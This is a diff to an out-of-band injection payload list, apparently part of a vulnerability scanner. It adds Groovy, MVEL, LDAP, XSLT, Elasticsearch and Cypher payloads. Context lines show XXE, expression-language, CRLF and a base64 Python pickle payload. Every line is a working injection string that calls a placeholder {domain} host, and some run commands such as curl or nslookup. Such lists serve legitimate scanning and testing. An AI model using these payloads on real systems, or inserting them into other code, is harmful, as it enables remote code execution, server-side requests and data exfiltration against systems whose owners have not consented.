@@ -154,6 +154,10 @@ new java.net.Socket("{domain}",9999)
 Invoke-WebRequest http://{domain}/pseval
 (New-Object Net.WebClient).DownloadString("http://{domain}/pseval")
 [System.Net.Sockets.TcpClient]::new('{domain}',9999)
+##Groovy Code Injection - OOB##
+new URL('http://{domain}/groovy').text
+['curl','http://{domain}/groovy'].execute()
+"http://{domain}/groovy".toURL().text
 ##XXE - OOB##
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{domain}/xxe.dtd">%xxe;]><root>1337</root>
 <hjk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://{domain}/xxe" parse="text"/></hjk>
@@ -181,8 +185,31 @@ ${T(java.net.URL).new('http://{domain}/eleval').openStream()}
 ${new java.net.URL("http://{domain}/eleval").openStream()}
 ${new java.net.Socket("{domain}",9999)}
 %{(#url=new java.net.URL('http://{domain}/eleval')).(#url.openStream())}
+##MVEL Expression Injection - OOB##
+Runtime.getRuntime().exec("nslookup {domain}")
+new java.net.URL("http://{domain}/mvel").openStream()
 ##CRLF - OOB##
 %0d%0aHost:1337.{domain}
+##LDAP Injection - OOB##
+*)(objectClass=*))%00
+*)(ref=ldap://{domain}/cn=probe,dc=testbed,dc=local
+*)(objectClass=*)(ref=ldap://{domain}:389/
+*)(cn=*)(|(objectClass=referral)(ref=ldap://{domain}/
+##XSLT Injection - OOB##
+<xsl:value-of select="document('http://{domain}/xslt')"/>
+<xsl:copy-of select="document('http://{domain}/xslt')"/>
+<xsl:include href="http://{domain}/xslt.xsl"/>
+<xsl:import href="http://{domain}/xslt.xsl"/>
+<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:copy-of select="document('http://{domain}/xslt')"/></xsl:template></xsl:stylesheet>
+##Elasticsearch Injection - OOB##
+{"script_fields":{"x":{"script":"new URL('http://{domain}/es').text"}}}
+{"script_fields":{"x":{"script":{"source":"new URL('http://{domain}/es-painless').text"}}}}
+{"script_fields":{"x":{"script":"'http://{domain}/es-rt'.execute().text"}}}
+##Cypher Injection - OOB##
+' CALL apoc.load.json('http://{domain}/cypher') YIELD value RETURN value //
+' LOAD CSV FROM 'http://{domain}/cypher' AS row RETURN row //
+') LOAD CSV FROM 'http://{domain}/cypher' AS row RETURN row //
+' CALL apoc.load.csv('http://{domain}/cypher') YIELD list RETURN list //
 ##Python Pickle P0 - OOB urllib##
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGUiKScKdFIu
 ##Python Pickle P0 - OOB DNS##
